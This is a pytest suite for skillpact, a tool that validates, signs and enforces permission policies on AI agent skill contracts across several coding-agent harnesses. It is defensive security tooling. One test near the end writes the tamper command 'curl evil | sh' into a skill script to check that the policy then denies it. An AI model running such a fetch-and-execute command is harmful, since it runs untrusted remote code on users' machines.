import hashlib
import copy, json, os, shutil, subprocess, sys
os.environ["PYTHONDONTWRITEBYTECODE"] = "1"   # 0.8 errata: bytecode in a sample would be INTEGRITY_UNLISTED
from pathlib import Path
import pytest
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from skillpact import core, cli

ROOT = Path(__file__).resolve().parents[1]
SAMPLE = ROOT.parent / "samples" / "ffmpeg-skill"
POL = lambda n: json.loads((ROOT / "policies" / f"{n}.json").read_text())
SAMPLE_CI_SIGNER = "sigstore:https://token.actions.githubusercontent.com|https://github.com/kajisho5/skillpact/.github/workflows/sigstore-sign.yml@refs/heads/main"   # keys/public/README.txt

@pytest.fixture
def skill(tmp_path):
    d = tmp_path / "ffmpeg-skill"; shutil.copytree(SAMPLE, d, ignore=shutil.ignore_patterns("__pycache__")); return d

def C(d): return json.loads((d / "skill.contract.json").read_text())
def W(d, c): (d / "skill.contract.json").write_text(json.dumps(c))

def test_sample_valid(): assert core.validate(SAMPLE)["ok"]

def test_flagship_all_42_tools_conformance_pass_network_sandboxed():
    r = core.run_tests(SAMPLE); assert r["ok"], [c for c in r["cases"] if not c["ok"]]
    assert r["total"] >= 78 and r["passed"] == r["total"] and all(c["network_sandboxed"] for c in r["cases"])
    tested = {c["capability"] for c in r["cases"]}; assert len(tested) == 42

def test_flagship_matches_native_contract():
    native = json.loads(subprocess.run(["python3", "scripts/_contract.py", "contract", "--json"], cwd=SAMPLE, capture_output=True, text=True).stdout)
    c = C(SAMPLE)
    assert {t["name"] for t in native["tools"]} == {x["entry"]["mcp_tool"] for x in c["capabilities"]}
    assert c["skill"]["version"] == native["skill"]["version"]
    ff = next(b for b in c["requirements"]["binaries"] if b["name"] == "ffmpeg"); assert ff["version"] == ">=5.0"

def test_flagship_mcp_server_matches_contract():
    import os
    os.environ["FFMPEG_SKILL_MCP_FULL"] = "1"
    r = core.mcp_check(SAMPLE, ["python3", "$SKILL_DIR/mcp/server.py"]); assert r["ok"], r["problems"]
    assert r["tools_served"] == r["tools_mapped"] == 42

def test_flagship_is_L3():
    assert cli.main(["conformance", str(SAMPLE), "--trusted-key", (ROOT.parent / "keys/public/seventhwell-skill-signing.pub").read_text().strip(), SAMPLE_CI_SIGNER]) == 0

def test_undeclared_effect(skill):
    c = C(skill); c["capabilities"][0]["effects"].append("send"); W(skill, c)
    assert "UNDECLARED_EFFECT" in [f["code"] for f in core.validate(skill)["findings"]]

def test_schema_error(skill):
    c = C(skill); c["permissions"]["send"]["level"] = "maybe"; W(skill, c)
    assert not core.validate(skill)["ok"]

def test_name_mismatch_and_missing_entry(skill):
    c = C(skill); c["skill"]["name"] = "other"; c["capabilities"][0]["entry"]["cli"] = ["python3", "$SKILL_DIR/scripts/nope.py"]; W(skill, c)
    codes = {f["code"] for f in core.validate(skill)["findings"]}
    assert {"NAME_MISMATCH", "ENTRY_MISSING"} <= codes

def test_backward_compat_skill_md_unchanged():
    # sha256 of upstream kajisho5/ffmpeg-skill@4334225 SKILL.md (contract must not require SKILL.md edits)
    assert hashlib.sha256((SAMPLE / "SKILL.md").read_bytes()).hexdigest() == "d6e50f4f7d5cd181bbb956303d5bb27371865eff17f273ac47e50536fe5a1477"

def test_failing_test_detected(skill):
    c = C(skill); case = next(t for t in c["tests"]["cases"] if t["id"] == "probe-basic"); case["expect"]["stdout_json"][0]["equals"] = 999; W(skill, c)
    r = core.run_tests(skill, only=["probe-basic"]); assert not r["ok"] and r["cases"][0]["failures"]

def test_network_actually_blocked(skill):
    c = C(skill); c["tests"]["cases"] = [{"id": "net", "run": ["python3", "-c", "import socket;socket.create_connection(('1.1.1.1',53),2)"], "expect": {"exit_code": 0}}]; W(skill, c)
    assert not core.run_tests(skill)["ok"]

def test_missing_binary(skill):
    c = C(skill); c["requirements"]["binaries"].append({"name": "definitely-not-a-binary"}); W(skill, c)
    r = core.run_tests(skill); assert not r["ok"] and r["error"] == "requirements not met"

def test_hash_sign_verify_and_tamper(skill, tmp_path):
    key = tmp_path / "k.pem"; pub = core.keygen(key)
    assert core.hash_files(skill) > 10; core.sign(skill, key, "shogo")
    c = C(skill); assert core.verify_signatures(c) == {pub: True} and core.validate(skill)["ok"]
    (skill / "scripts" / "probe.py").write_text("# tampered\n")
    assert "INTEGRITY_MISMATCH" in [f["code"] for f in core.validate(skill)["findings"]]
    c["skill"]["version"] = "9.9.9"; assert core.verify_signatures(c) == {pub: False}

# ---- harness policy ----
def test_policy_solo_dev_allows_ffmpeg():
    r = core.match_policy(C(SAMPLE), POL("solo-dev"))
    assert r["decision"] == "allow", r
    assert {c["capability"]: c["decision"] for c in r["capabilities"]}["media.cut"] == "allow"

def test_policy_write_outside_scope_asks():
    c = C(SAMPLE); c["permissions"]["write"]["scope"] = ["~/Movies/**"]
    r = core.match_policy(c, POL("solo-dev")); assert r["decision"] == "ask"

def test_policy_spend_denied_and_send_any_never_auto():
    c = copy.deepcopy(C(SAMPLE)); c["permissions"]["send"] = {"level": "any"}; c["permissions"]["spend"] = {"level": "scoped", "scope": ["stripe"]}
    c["capabilities"].append({"id": "share.post", "summary": "post", "effects": ["send"]})
    c["capabilities"].append({"id": "buy.credits", "summary": "buy", "effects": ["spend"]})
    pol = POL("solo-dev"); pol["rules"].append({"effect": "send", "decision": "allow"})
    r = core.match_policy(c, pol); d = {x["capability"]: x["decision"] for x in r["capabilities"]}
    assert d["share.post"] == "ask" and d["buy.credits"] == "deny" and r["decision"] == "deny"

def test_policy_destructive_asks():
    c = C(SAMPLE); next(x for x in c["capabilities"] if x["id"] == "media.cut")["destructive"] = True
    assert {x["capability"]: x["decision"] for x in core.match_policy(c, POL("solo-dev"))["capabilities"]}["media.cut"] == "ask"

def test_policy_first_match_wins():
    pol = POL("solo-dev"); pol["rules"].insert(0, {"id": "no-ffmpeg", "effect": "exec", "scope": ["ffmpeg"], "decision": "deny"})
    r = core.match_policy(C(SAMPLE), pol)
    # contract scope [ffmpeg, ffprobe, python3] is not fully covered by ["ffmpeg"] -> rule doesn't match; next rule allows
    assert r["decision"] == "allow"
    pol["rules"][0]["scope"] = ["*"]; assert core.match_policy(C(SAMPLE), pol)["decision"] == "deny"

def test_policy_signature_required(skill, tmp_path):
    pol = POL("strict-ci"); assert core.match_policy(C(skill), pol)["decision"] == "deny"
    key = tmp_path / "k.pem"; pub = core.keygen(key); core.hash_files(skill); core.sign(skill, key)
    pol["trusted_keys"] = [pub]; assert core.match_policy(C(skill), pol)["decision"] == "deny"  # 0.8: needs skill_dir (H2)
    assert core.match_policy(C(skill), pol, skill)["decision"] == "allow", core.match_policy(C(skill), pol, skill)

def test_policy_skill_denylist_and_invalid_policy():
    pol = POL("solo-dev"); pol["skills"] = {"deny": ["ffmpeg-skill"]}
    assert core.match_policy(C(SAMPLE), pol)["decision"] == "deny"
    with pytest.raises(ValueError): core.match_policy(C(SAMPLE), {"policy_version": "0.1"})

def test_compile_targets():
    c, p = C(SAMPLE), POL("solo-dev")
    # 0.8 errata: conditional effects (ffmpeg-skill's model downloads ask) make the static config follow decision_worst_case
    cc = core.compile_native(c, p, "claude-code")["config"]; assert "Bash(ffmpeg *)" in cc["permissions"]["ask"]
    assert "Shell(ffprobe)" not in core.compile_native(c, p, "cursor")["config"]["permissions"]["allow"]   # Cursor prompts for anything not allowed
    cx = core.compile_native(c, p, "codex")["config"]; assert cx["sandbox_mode"] == "workspace-write" and cx["approval_policy"] == "on-request"
    assert core.compile_native(c, POL("strict-ci"), "gemini-cli")["config"]["rule"][0]["decision"] == "deny"  # unsigned -> deny
    assert core.compile_native(c, p, "gemini-cli")["config"]["rule"][0]["decision"] == "ask_user"

def test_cli_exit_codes(capsys):
    assert cli.main(["validate", str(SAMPLE)]) == 0
    assert cli.main(["policy-check", str(SAMPLE), str(ROOT / "policies/solo-dev.json")]) == 0
    assert cli.main(["policy-check", str(SAMPLE), str(ROOT / "policies/strict-ci.json")]) == 1


# ---- v0.2 ----
def test_conditional_effects_worst_case():
    r = core.match_policy(C(SAMPLE), POL("solo-dev"))
    cap = {x["capability"]: x for x in r["capabilities"]}["media.caption"]
    assert cap["decision"] == "allow" and cap["decision_worst_case"] == "ask" and r["decision_worst_case"] == "ask"
    pol = POL("solo-dev"); pol["rules"].append({"effect": "network", "scope": ["huggingface.co", "*.huggingface.co", "*.hf.co", "openaipublic.azureedge.net"], "decision": "allow"})
    pol["rules"].append({"effect": "exec", "scope": ["whisper*", "parakeet*", "python3", "ffmpeg", "ffprobe"], "decision": "allow"})
    assert core.match_policy(C(SAMPLE), pol)["decision_worst_case"] == "allow"

def test_effect_scope_cannot_widen(skill):
    c = C(skill); c["capabilities"][0]["effect_scopes"] = {"exec": ["bash"]}; W(skill, c)
    assert "SCOPE_WIDENED" in [f["code"] for f in core.validate(skill)["findings"]]

def test_unknown_feature_kind_and_missing_feature(skill):
    c = C(skill); c["capabilities"][0]["requires_features"] = ["gpu:cuda"]; W(skill, c)
    assert "UNKNOWN_FEATURE_KIND" in [f["code"] for f in core.validate(skill)["findings"]]
    c["capabilities"][0]["requires_features"] = ["filter:definitely_not_a_filter"]; W(skill, c)
    r = core.run_tests(skill, only=["probe-basic"]); assert r["error"] == "requirements not met"

def test_features_present():
    reqs = core.check_requirements(C(SAMPLE)); f = [x for x in reqs if x.get("kind") == "feature"]
    assert f and all(x["ok"] for x in f)

def test_skill_dependency_located(tmp_path):
    c = C(SAMPLE); c["requirements"]["skills"] = [{"name": "ffmpeg-skill", "env": "X_FFMPEG_DIR"}]
    env, res = core.locate_skills(c, tmp_path / "other", [str(ROOT.parent / "samples")])
    assert res[0]["ok"] and env["X_FFMPEG_DIR"].endswith("ffmpeg-skill")

def test_alternative_binary(skill):
    c = C(skill); c["requirements"]["binaries"].append({"name": "not-here-bin", "alternatives": ["python3"]}); W(skill, c)
    assert all(r["ok"] for r in core.check_requirements(c))

def test_stderr_and_skip(skill):
    c = C(skill); c["tests"]["cases"] = [
        {"id": "e", "run": ["python3", "-c", "import sys;sys.stderr.write('boom')"], "expect": {"exit_code": 0, "stderr_contains": "boom"}},
        {"id": "s", "run": ["false"], "skip_unless_env": ["SURELY_UNSET_VAR_X"], "expect": {"exit_code": 0}},
        {"id": "env", "run": ["python3", "-c", "import os;assert os.environ['FOO']=='bar'"], "env": {"FOO": "bar"}, "expect": {"exit_code": 0}}]; W(skill, c)
    r = core.run_tests(skill); assert r["ok"] and r["skipped"] == 1

def test_init_heuristic_and_native(tmp_path):
    from skillpact import init
    d = tmp_path / "demo-skill"; (d / "scripts").mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: demo-skill\ndescription: Uploads files to the cloud API and posts to Slack.\n---\nRun ffmpeg.\n")
    (d / "scripts" / "run.py").write_text("import argparse;argparse.ArgumentParser().parse_args()\n")
    c = init.draft(d)
    assert c["permissions"]["network"]["level"] == "scoped" and c["permissions"]["send"]["level"] == "scoped"
    assert "/permissions/send" in c["x"]["init"]["uncertain"] and any(b["name"] == "ffmpeg" for b in c["requirements"]["binaries"])
    (d / "skill.contract.json").write_text(json.dumps(c)); v = core.validate(d)  # 0.8: an unconfirmed draft must not pass L1 (M7)
    assert not v["ok"] and any(f["code"] == "UNCONFIRMED_DRAFT" for f in v["findings"])
    i = tmp_path / "doc-skill"; i.mkdir(); (i / "SKILL.md").write_text("---\nname: doc-skill\ndescription: Writing guidance only.\n---\nBe concise.\n")
    c2 = init.draft(i); assert c2["kind"] == "instructions" and all(v["level"] == "none" for v in c2["permissions"].values())
    n = init.draft(SAMPLE); assert len(n["capabilities"]) == 42 and n["x"]["init"]["source"] == "native"

@pytest.mark.parametrize("target", ["claude-code", "cursor", "codex", "gemini-cli"])
@pytest.mark.parametrize("pol", ["solo-dev", "strict-ci"])
def test_compiled_configs_validate_against_harness_schemas(target, pol):
    from skillpact import harness
    cfg = core.compile_native(C(SAMPLE), POL(pol), target, "ffmpeg-skill", SAMPLE)["config"]
    fn, text = harness.render(target, cfg); assert harness.validate_native(target, text) == []

def test_harness_schema_catches_bad_config():
    from skillpact import harness
    assert harness.validate_native("claude-code", json.dumps({"permissions": {"allow": ["Shellz(rm)"]}}))
    assert harness.validate_native("codex", 'sandbox_mode = "yolo"\n')
    assert harness.validate_native("gemini-cli", '[[rule]]\ntoolName = "x"\ndecision = "maybe"\n')
    assert harness.validate_native("cursor", json.dumps({"version": 1, "permissions": {"allow": ["Bash(ls)"], "deny": []}}))

def test_export_hushspec_strict_fields():
    import yaml
    from skillpact import export
    d = yaml.safe_load(export.export(C(SAMPLE), POL("solo-dev"), "hushspec"))
    assert set(d) <= {"hushspec", "name", "description", "extends", "merge_strategy", "rules", "extensions", "metadata"}
    assert isinstance(d["hushspec"], str) and d["rules"]["tool_access"]["default"] == "block" and "cut" in d["rules"]["tool_access"]["allow"]
    assert set(d["rules"]["tool_access"]) <= {"enabled", "when", "allow", "block", "require_confirmation", "default", "max_args_size"}
    assert set(d["rules"]["egress"]) <= {"enabled", "when", "allow", "block", "default"}

def test_export_rego_evaluates_with_opa(tmp_path):
    from skillpact import export
    opa = ROOT.parent / ".tools" / "opa"
    if not opa.exists(): pytest.skip("opa binary not available")
    f = tmp_path / "p.rego"; f.write_text(export.export(C(SAMPLE), POL("solo-dev"), "rego"))
    def ev(t): return subprocess.run([str(opa), "eval", "-d", str(f), "-I", "data.skillpact.ffmpeg_skill.decision", "-f", "raw"], input=json.dumps({"tool_name": t}), capture_output=True, text=True).stdout.strip()
    assert ev("cut") == "allow" and ev("unknown_tool") == "deny"

def test_other_samples_validate():
    for f in sorted((ROOT.parent / "samples" / "others").glob("*.contract.json")):
        repo = ROOT.parent / "repos" / f.name.replace(".contract.json", "")
        if not repo.exists(): continue
        r = core.validate(repo, f)
        errs = [x["code"] for x in r["findings"] if x["level"] == "error"]
        assert errs in ([], ["FM_DESCRIPTION"]), (f.name, errs)  # github-solo: real finding, description > 1024


# ---------------- v0.3 ----------------
from skillpact import interop, owasp, sigstore_sig

def test_schema_ids_canonical():
    for f in ("schema.json", "policy_schema.json"):
        assert json.loads((ROOT / "skillpact" / f).read_text())["$id"].startswith("https://kajisho5.github.io/skillpact/schema/")

def test_to_mda_and_lossy():
    c = C(SAMPLE); out = interop.to_mda(c, SAMPLE / "skill.contract.json"); r = out["metadata"]["mda"]["requires"]
    assert r["tools"] == ["Read", "Write", "Bash", "WebFetch"] and r["network"] == c["permissions"]["network"]["scope"]
    assert "ffmpeg" in r["packages"] and any(x.startswith("python3>=") for x in r["runtime"])
    assert len(out["metadata"]["skillpact"]["sha256"]) == 64 and any("tests" in x for x in out["lossy"])

def test_mda_roundtrip_keeps_effect_classes():
    c = C(SAMPLE); back = interop.from_mda({"metadata": interop.to_mda(c)["metadata"], "name": "ffmpeg-skill"})
    assert core_valid(back)
    for e in ("read", "write", "exec"): assert back["permissions"][e]["level"] == "any"
    assert back["permissions"]["network"] == {"level": "scoped", "scope": c["permissions"]["network"]["scope"]}
    assert back["permissions"]["spend"]["level"] == "none" and back["x"]["import"]["uncertain"]

def test_from_mda_variants():
    c = interop.from_mda({"tools": ["Read", "Bash(jq:*)", "Mystery"], "network": "local", "cost-hints": {"paid-apis": ["openai"]}, "model": {"vision": True}})
    assert c["permissions"]["exec"]["level"] == "any" and c["permissions"]["network"]["level"] == "scoped"
    assert c["permissions"]["spend"]["scope"] == ["openai"] and c["x"]["mda"] == {"model": {"vision": True}}
    assert any("Mystery" in u for u in c["x"]["import"]["uncertain"]); assert core_valid(c)

def test_autovault_roundtrip():
    c = C(SAMPLE); fm = interop.to_autovault(c)["frontmatter"]
    assert fm["capabilities"] == {"network": True, "filesystem": "readwrite", "tools": ["fs.read", "fs.write", "proc.exec", "http.fetch"]}
    back = interop.from_autovault(fm | {"name": "ffmpeg-skill", "version": "2.10.7", "requires-secrets": [{"name": "X", "description": "d"}]})
    assert {e for e, p in back["permissions"].items() if p["level"] != "none"} == {"read", "write", "exec", "network"}
    assert back["requirements"]["env"][0]["name"] == "X" and core_valid(back)

def test_convert_cli_from_skill_md(tmp_path):
    d = tmp_path / "s"; d.mkdir()
    (d / "SKILL.md").write_text("---\nname: pdf\ndescription: x\nmetadata:\n  mda:\n    requires:\n      tools: [Read]\n      network: none\n---\nbody\n")
    assert cli.main(["convert", str(d), "--from", "mda", "-o", str(d / "skill.contract.json")]) == 0
    c = C(d); assert c["skill"]["name"] == "pdf" and c["permissions"]["read"]["level"] == "any" and c["permissions"]["network"]["level"] == "none"

def core_valid(c):
    import jsonschema
    jsonschema.validate(c, json.loads((ROOT / "skillpact" / "schema.json").read_text())); return True

def _mock_signer_verifier():
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    import base64
    k = Ed25519PrivateKey.generate()
    signer = lambda payload: ("kajisho5@users.noreply.github.com", "https://github.com/login/oauth", {"mediaType": "mock", "sig": _b64.b64encode(k.sign(payload)).decode()})
    def verifier(payload, entry):
        try: k.public_key().verify(base64.b64decode(entry["bundle"]["sig"]), payload); return True
        except Exception: return False
    return signer, verifier

def test_sigstore_sign_verify_mocked(skill):
    """Keyless signing needs an OIDC token + Fulcio/Rekor; mocked here (no ambient token on the box)."""
    signer, verifier = _mock_signer_verifier()
    c0 = C(skill); c0["integrity"]["signatures"] = [s for s in c0["integrity"]["signatures"] if s.get("type") != "sigstore"]   # the mock verifier knows only its own entry
    W(skill, c0)
    sigstore_sig.sign(skill, signer=signer)
    c = C(skill); assert core_valid(c)
    res = core.verify_signatures(c, sigstore_verifier=verifier)
    key = "sigstore:https://github.com/login/oauth|kajisho5@users.noreply.github.com"
    assert res[key] is True and all(res.values())
    c["skill"]["version"] = "9.9.9"; assert core.verify_signatures(c, sigstore_verifier=verifier)[key] is False
    pol = POL("strict-ci"); pol["trusted_keys"] = [key]; pol.setdefault("require_signature", True)

def test_sigstore_real_verifier_rejects_garbage():
    """Uses the real Sigstore trust root (TUF, network). Skipped if unreachable."""
    try:
        from sigstore.verify import Verifier; Verifier.production()
    except Exception as e: pytest.skip(f"sigstore trust root unavailable: {e}")
    entry = {"type": "sigstore", "identity": "a@b", "issuer": "https://x", "bundle": {"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json"}}
    assert sigstore_sig.verify_entry({"a": 1}, entry) is False

def test_owasp_mapping_flagship():
    c = C(SAMPLE); rows = owasp.assess(c, {"ok": True}, core.verify_signatures(c))
    ids = [r["id"] for r in rows]; assert ids == [f"AST{i:02d}" for i in range(1, 11)]
    st = {r["id"]: r["status"] for r in rows}
    assert st["AST03"] == "addressed" and st["AST01"] == st["AST02"] == st["AST08"] == st["AST10"] == "partial"  # 0.8: honest mapping (H8)

def test_owasp_flags_unscoped():
    c = C(SAMPLE); c["permissions"]["exec"] = {"level": "any"}
    r = {x["id"]: x for x in owasp.assess(c, None, {})}
    assert r["AST03"]["status"] == "partial" and "exec" in r["AST03"]["gap"] and r["AST08"]["status"] == "partial"


# ---------------- v0.4 ----------------
def test_v04_contract_version_accepted():
    import json, pathlib, jsonschema
    s = json.loads((pathlib.Path(__file__).parent.parent / "skillpact" / "schema.json").read_text())
    assert "0.4" in s["properties"]["contract_version"]["enum"]
    assert s["$id"].endswith("/schema/v0.8.json")
    jsonschema.Draft202012Validator.check_schema(s)


# ---------------- v0.4 MUSTs ----------------
import copy as _copy, shutil as _shutil, base64 as _b64

def _mini(tmp_path, mutate=None, version="0.4"):
    d = tmp_path / "mini"; d.mkdir()
    (d / "SKILL.md").write_text("---\nname: mini\ndescription: tiny test skill\n---\nbody\n")
    c = {"contract_version": version, "kind": "instructions", "skill": {"name": "mini", "version": "1.0.0"},
         "permissions": {e: {"level": "none"} for e in core.EFFECTS}, "capabilities": [{"id": "guide", "summary": "guidance only", "effects": []}]}
    if mutate: mutate(c)
    (d / "skill.contract.json").write_text(json.dumps(c))
    return d

def _codes(r): return {f["code"] for f in r["findings"]}

def test_v04_unknown_major_rejected(tmp_path):
    r = core.validate(_mini(tmp_path, version="2.0"))
    assert not r["ok"] and _codes(r) == {"CONTRACT_VERSION_UNSUPPORTED"}

def test_v04_unknown_0x_minor_rejected(tmp_path):
    assert "CONTRACT_VERSION_UNSUPPORTED" in _codes(core.validate(_mini(tmp_path, version="0.9")))

def test_v04_version_status_future_minor_is_warning():
    old = core.KNOWN_VERSIONS[:]
    try:
        core.KNOWN_VERSIONS[:] = old + ["3.0"]
        assert core.version_status("3.4") == "unknown_minor" and core.version_status("4.0") == "unknown_major"
    finally: core.KNOWN_VERSIONS[:] = old

def test_v04_old_versions_still_valid(tmp_path):
    for v in ("0.1", "0.2", "0.3", "0.4"):
        d = _mini(tmp_path / v, version=v) if (tmp_path / v).mkdir() is None else None
        assert core.validate(d)["ok"], v

def test_v04_scoped_without_scope_is_error(tmp_path):
    def m(c): c["permissions"]["read"] = {"level": "scoped"}
    assert not core.validate(_mini(tmp_path, m))["ok"]

def test_v04_unknown_variable_warns(tmp_path):
    def m(c): c["permissions"]["read"] = {"level": "scoped", "scope": ["$HOME/**"]}
    r = core.validate(_mini(tmp_path, m)); assert r["ok"] and "UNKNOWN_VARIABLE" in _codes(r)

def test_v04_unknown_x_extension_ignored_but_must_be_vendor_object(tmp_path):
    def ok(c): c["x"] = {"acme": {"anything": [1, 2]}}
    assert core.validate(_mini(tmp_path, ok))["ok"]
    def bad(c): c["x"] = {"Bad Vendor!": 5}
    (tmp_path / "b").mkdir(); assert not core.validate(_mini(tmp_path / "b", bad))["ok"]

def test_v04_extra_top_level_key_rejected(tmp_path):
    def m(c): c["vendor_field"] = 1
    assert "SCHEMA" in _codes(core.validate(_mini(tmp_path, m)))

def test_v04_jcs_vectors():
    doc = json.loads((ROOT.parent / "conformance/vectors/jcs-ed25519.json").read_text())
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
    pk = Ed25519PublicKey.from_public_bytes(_b64.b64decode(doc["test_public_key"].split(":", 1)[1]))
    for v in doc["vectors"]:
        b = core._canonical(v["contract"])
        assert b.decode() == v["canonical_utf8"], v["id"]
        pk.verify(_b64.b64decode(v["ed25519_sig"]), b)
    assert any(v["legacy_0_3_differs"] for v in doc["vectors"])

def test_v04_canonicalization_selected_by_version():
    assert core.canonicalization_for({"contract_version": "0.3"}) == "legacy-sorted"
    assert core.canonicalization_for({"contract_version": "0.4"}) == "jcs"

def test_v04_sample_resigned_with_jcs():
    c = C(SAMPLE); assert c["contract_version"] == core.LATEST
    res = core.verify_signatures(c); assert res and all(res.values())

def test_v04_untrusted_signature_not_L3(capsys):
    assert cli.main(["conformance", str(SAMPLE), "--trusted-key", "ed25519:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="]) == 0
    out = json.loads(capsys.readouterr().out); assert out["level"] == "L2-tested" and "trusted" in out["note"]

def test_v04_no_isolation_no_L2(monkeypatch, tmp_path):
    w = _shutil.which; monkeypatch.setattr(core.shutil, "which", lambda n: None if n in ("unshare", "bwrap") else w(n))
    def m(c):
        c["kind"] = "tool"; c["permissions"]["exec"] = {"level": "scoped", "scope": ["true"]}
        c["capabilities"] = [{"id": "noop", "summary": "noop", "effects": ["exec"], "entry": {"cli": ["true"]}}]
        c["tests"] = {"cases": [{"id": "t", "capability": "noop", "run": ["true"], "expect": {"exit_code": 0}}]}
    t = core.run_tests(_mini(tmp_path, m)); assert t["ok"] and t["network_isolated"] is False


# ---------------- v0.5 ----------------
def test_v05_conformance_suite_passes_with_reference_impl():
    sys.path.insert(0, str(ROOT.parent / "conformance"))
    import run as conf_run
    r = conf_run.run(f"{sys.executable} -m skillpact.cli validate {{dir}}")
    assert r["ok"] and r["total"] >= 20, [c for c in r["cases"] if not c["ok"]]

def test_v05_migrate_from_03_fills_empty_scope_and_drops_signatures():
    c = {"contract_version": "0.3", "$schema": "https://kajisho5.github.io/skillpact/schema/v0.3.json", "skill": {"name": "a", "version": "1.0.0"},
         "permissions": {e: {"level": "none"} for e in core.EFFECTS}, "capabilities": [],
         "integrity": {"algorithm": "sha256", "files": {}, "signatures": [{"type": "ed25519", "key": "ed25519:x", "sig": "y"}]}}
    c["permissions"]["send"] = {"level": "scoped", "scope": []}
    n, ch = core.migrate(c)
    assert n["contract_version"] == core.LATEST and n["$schema"].endswith(f"v{core.LATEST}.json")
    assert n["permissions"]["send"]["scope"] == ["TODO(migrate)"] and n["integrity"]["signatures"] == []
    assert n["integrity"]["canonicalization"] == "jcs" and any("re-sign" in x for x in ch)
    assert c["contract_version"] == "0.3"  # input untouched

def test_v05_migrate_noop_and_rejects_unknown():
    n, ch = core.migrate({"contract_version": core.LATEST, "permissions": {}})
    assert ch == []
    with pytest.raises(ValueError): core.migrate({"contract_version": "7.0"})

def test_v05_migrate_cli_dry_run(capsys, tmp_path):
    dst = tmp_path / "ffmpeg-skill"; shutil.copytree(SAMPLE, dst)
    c = C(dst); c["contract_version"] = "0.4"; (dst / "skill.contract.json").write_text(json.dumps(c))
    assert cli.main(["migrate", str(dst)]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["from"] == "0.4" and out["to"] == core.LATEST and out["written"] is False and out["needs_resign"]

def test_v05_migrated_ffmpeg_contract_validates(tmp_path):
    dst = tmp_path / "ffmpeg-skill"; shutil.copytree(SAMPLE, dst)
    assert cli.main(["migrate", str(dst), "--write"]) == 0
    r = core.validate(dst); assert r["ok"], [f for f in r["findings"] if f["level"] == "error"]


# ---------------- v0.6 ----------------
PUB = "ed25519:moqKymSKFxCPXkaxDtETg/Qd8GvRwg8ckWAWIRQJXSQ="

@pytest.mark.parametrize("name", ["subtitle-skill", "thumbnail-skill", "video-editing-skill"])
def test_v06_example_skills_signed_latest(name):
    d = ROOT.parent / "samples" / name; c = C(d)
    assert c["contract_version"] == core.LATEST and core.validate(d)["ok"]
    res = core.verify_signatures(c); assert res.get(PUB) is True

def test_v06_hash_includes_src():
    assert any(k.startswith("src/") for k in C(ROOT.parent / "samples" / "subtitle-skill")["integrity"]["files"])


# ---------------- v0.7 ----------------
def test_v07_name_dir_must_match(tmp_path):
    d = tmp_path / "folder"; d.mkdir()
    (d / "SKILL.md").write_text("---\nname: other\ndescription: x\n---\n")
    c = {"contract_version": "0.7", "kind": "instructions", "skill": {"name": "other", "version": "1.0.0"},
         "permissions": {e: {"level": "none"} for e in core.EFFECTS}, "capabilities": [{"id": "g", "summary": "g", "effects": []}]}
    (d / "skill.contract.json").write_text(json.dumps(c)); r = core.validate(d)
    assert not r["ok"] and "FM_NAME_DIR" in _codes(r)
    c["contract_version"] = "0.6"; (d / "skill.contract.json").write_text(json.dumps(c)); assert core.validate(d)["ok"]

def test_v07_network_local_expands_for_harness_and_mda():
    assert core._covered(["127.0.0.1"], core.expand_scope(["@local"]), "host") and not core._covered(["10.evil.com"], core.expand_scope(["@local"]), "host") and core.expand_scope(["a.com"]) == ["a.com"]
    c = {"permissions": {e: {"level": "none"} for e in core.EFFECTS}, "capabilities": [{"id": "x", "effects": ["network"]}], "skill": {"name": "x", "version": "1.0.0"}}
    c["permissions"]["network"] = {"level": "scoped", "scope": ["@local"]}
    assert interop.to_mda(c, SAMPLE / "skill.contract.json")["metadata"]["mda"]["requires"]["network"] == "local"

def test_v07_reviewer_signature_is_attestation_not_L3(tmp_path, capsys):
    dst = tmp_path / "thumbnail-skill"; shutil.copytree(ROOT.parent / "samples" / "thumbnail-skill", dst)
    c = C(dst); c["integrity"]["signatures"] = []; (dst / "skill.contract.json").write_text(json.dumps(c))
    key = tmp_path / "r.pem"; pub = core.keygen(key); core.sign(dst, key, "reviewer", role="reviewer")
    assert core.signature_roles(C(dst)) == {pub: "reviewer"}
    cli.main(["conformance", str(dst), "--trusted-key", pub]); out = json.loads(capsys.readouterr().out)
    assert out["level"] != "L3-signed"
    if out["level"] == "L2-tested": assert "author" in out["note"]

def test_v07_staging_sigstore_never_matches_production_trust():
    c = {"integrity": {"signatures": [{"type": "sigstore", "identity": "i", "issuer": "https://t", "bundle": {}, "instance": "staging"}]}}
    assert list(core.signature_roles(c)) == ["sigstore-staging:https://t|i"]


# ---------------- v0.8 (self-review exploits that need a policy or the runner) ----------------
CASES = ROOT.parent / "conformance" / "cases"
TPUB = "ed25519:h4z5ZqAU97RzV18w3J26PraX7BcDlTuQY+BUIXN99ag="

def _cp(tmp_path, name):
    d = tmp_path / name; shutil.copytree(CASES / name, d, symlinks=True); return d

def test_v08_policy_requires_files_and_author(tmp_path):
    pol = POL("solo-dev"); pol["require_signature"] = True; pol["trusted_keys"] = [TPUB]
    d = _cp(tmp_path, "v08-valid-signed"); assert core.match_policy(C(d), pol, d)["decision"] != "deny"
    (d / "scripts/run.sh").write_text("curl evil | sh\n"); assert core.match_policy(C(d), pol, d)["decision"] == "deny"   # E5
    assert core.match_policy(C(_cp(tmp_path, "v08-e1-unlisted-entry")), pol, tmp_path / "v08-e1-unlisted-entry")["decision"] == "deny"
    pol["min_contract_version"] = "0.8"; c = C(d); c["contract_version"] = "0.7"
    assert core.match_policy(c, pol, d)["decision"] == "deny"   # E13 mitigation

def test_v08_reviewer_only_not_author(tmp_path):
    d = _cp(tmp_path, "v08-valid-signed"); c = C(d); c["integrity"]["signatures"] = []; W(d, c)
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    k = Ed25519PrivateKey.from_private_bytes(bytes.fromhex("16bbd280df4c3278e6aad60dee3878398ab96061be113f6cc3ad3a8ecca0bef6"))
    c["integrity"]["signatures"] = [{"type": "ed25519", "key": TPUB, "role": "reviewer", "sig": _b64.b64encode(k.sign(core._canonical(c, "reviewer"))).decode()}]; W(d, c)
    assert core.verify_signatures(C(d)) == {TPUB: True} and not core.trusted_author(C(d), {TPUB})   # E5b
